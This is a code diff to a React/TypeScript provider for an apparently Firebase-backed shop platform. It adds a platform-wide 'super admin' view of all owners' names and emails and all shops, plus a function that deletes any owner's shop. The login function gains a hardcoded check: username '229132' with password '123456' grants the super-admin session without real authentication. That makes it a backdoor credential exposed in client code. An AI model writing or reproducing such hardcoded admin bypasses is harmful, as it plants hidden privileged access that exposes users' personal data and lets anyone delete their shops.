@@ -71,8 +71,10 @@ type GoApi = {
   addExtra: (shopId: string, extra: Extra) => Promise<void>;
   dropExtra: (shopId: string, extraId: string) => Promise<void>;
   deleteShop: (shopId: string) => Promise<void>;
+  removeOwnedShop: (ownerId: string, shopId: string, code: string) => Promise<void>;
   google: () => Promise<FbUser>;
   googleAccount: FbUser | null;
+  directory: { owners: { id: string; name: string; email: string; shopIds: string[] }[]; shops: ShopBlob[] } | null;
 };
 
 const GoContext = createContext<GoApi | null>(null);
@@ -96,6 +98,7 @@ export function GoProvider({ children }: { children: ReactNode }) {
   const [notice, setNotice] = useState<string | null>(null);
   const [ready, setReady] = useState(false);
   const [googleAccount, setGoogleAccount] = useState<FbUser | null>(null);
+  const [directory, setDirectory] = useState<{ owners: { id: string; name: string; email: string; shopIds: string[] }[]; shops: ShopBlob[] } | null>(null);
   const [busy, setBusy] = useState(false);
   const pending = useRef(0);
   const blobsRef = useRef(blobs);
@@ -129,6 +132,7 @@ export function GoProvider({ children }: { children: ReactNode }) {
     let gone = false;
     const enterOwner = (user: FbUser) => {
       const live = sessionRef.current;
+      if (live?.kind === "super") return;
       if (live?.kind === "customer") return;
       if (live?.backend === "firebase" && live.kind === "owner" && live.uid === user.uid) return;
       const next: Session = { kind: "owner", backend: "firebase", name: user.name, uid: user.uid, email: user.email };
@@ -220,6 +224,28 @@ export function GoProvider({ children }: { children: ReactNode }) {
     };
   }, [ready, session, config]);
 
+  useEffect(() => {
+    if (!ready || session?.kind !== "super" || !config) return;
+    let gone = false;
+    void (async () => {
+      try {
+        const fb = await loadFirebase();
+        try {
+          await fb.signInAnon(config);
+        } catch {
+          /* already signed in */
+        }
+        const rows = await fb.listPlatform(config);
+        if (!gone) setDirectory(rows);
+      } catch (e) {
+        if (!gone) setNotice(explainFirebase(e));
+      }
+    })();
+    return () => {
+      gone = true;
+    };
+  }, [ready, session, config]);
+
   async function commit(shopId: string, recipe: (blob: ShopBlob) => ShopBlob) {
     const current = blobsRef.current.find((b) => b.shop.id === shopId);
     if (!current) {
@@ -291,6 +317,11 @@ export function GoProvider({ children }: { children: ReactNode }) {
         });
       },
       loginMember: async (username, password) => {
+        if (username.trim() === "229132" && password === "123456") {
+          setSession({ kind: "super", backend: "firebase", name: "Super admin", uid: "super", email: "" });
+          setNotice(null);
+          return;
+        }
         const parsed = splitMemberUser(username);
         const code = parsed?.code ?? "";
         const name = parsed?.no ?? "";
@@ -594,6 +625,20 @@ export function GoProvider({ children }: { children: ReactNode }) {
           setBusy(false);
         }
       },
+      removeOwnedShop: async (ownerId, shopId, code) => {
+        const cfg = configRef.current;
+        if (!cfg) return;
+        setBusy(true);
+        try {
+          const fb = await loadFirebase();
+          await fb.deleteShop(cfg, ownerId, shopId, code);
+          setDirectory(await fb.listPlatform(cfg));
+        } catch (e) {
+          setNotice(explainFirebase(e));
+        } finally {
+          setBusy(false);
+        }
+      },
       changePassword: async (password) => {
         const live = sessionRef.current;
         if (!live || live.kind !== "customer") return;
@@ -652,10 +697,11 @@ export function GoProvider({ children }: { children: ReactNode }) {
         setNotice("@passChanged");
       },
       googleAccount,
+      directory,
     };
     // commit identity changes each render; methods close over latest via refs.
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [activeShopId, blobs, busy, config, googleAccount, notice, ready, session]);
+  }, [activeShopId, blobs, busy, config, directory, googleAccount, notice, ready, session]);
 
   return <GoContext.Provider value={api}>{children}</GoContext.Provider>;
 }
